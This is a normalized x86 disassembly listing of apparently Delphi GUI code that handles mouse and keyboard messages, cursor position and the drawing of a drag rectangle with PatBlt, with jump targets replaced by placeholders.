sub_4343f8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_434444
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43455f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d358
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434566
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_434598
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4334b4
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4032ec
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4032ec
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4032ec
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4032ec
jmp r-xdata
sub_434688
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412404
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_434b70
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_433900
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_433914
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412454
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434868
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_433488
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4032ec
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43a170
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_431084
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_434853
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43a170
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43a170
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_433310
test esi esi
je r-xdata
sub_434868
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4032ec
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_4356ec
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4032ec
mov eax esi
call sub_4333b8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_433374
mov ecx eax
xor edx edx
xor eax eax
call sub_41242c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4032ec
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43490c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43493c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4349a8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_434a68
sub_4349d8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_434a08
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4334b4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434a34
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_434a68
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_434b3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_434b70
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_434c08
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44a5dc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44a5dc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_433510
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_453d88
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4032ec
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44a520
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4032ec
jmp r-xdata
sub_434d9c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408484
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4084b0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_433510
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4082c8
call sub_408264
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408264
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_434e44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_434e74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_434e38
push ebp
call sub_434e44
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434ec2
add [ eax ] al
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_434f50
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_434f88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_434a08
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44a490
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4032ec
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44a490
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4032ec
sub_43500c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4334e0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_433ba8
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_434f88
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_435058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4334e0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_435074
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4334e0
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_433ba8
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_434f88
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4032ec
sub_4350cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4349a8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43493c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4349a8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_435168
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_434f88
pop esi
pop ebx
retn
sub_43518d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_434f88
pop esi
pop ebx
retn
sub_4351b3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_434f88
pop esi
pop ebx
retn
sub_4351dd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_434f88
pop esi
pop ebx
retn
sub_435203
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_435238
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_434a08
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44a490
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4032ec
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44a490
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4032ec
sub_4352b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4352e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44a490
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4032ec
sub_435320
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_433ba8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4352e8
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4067b8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4032ec
sub_435398
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4352e8
pop esi
pop ebx
retn
sub_4353b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4352e8
pop esi
pop ebx
retn
sub_4353d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44a490
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4032ec
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_43e980
pop edi
pop esi
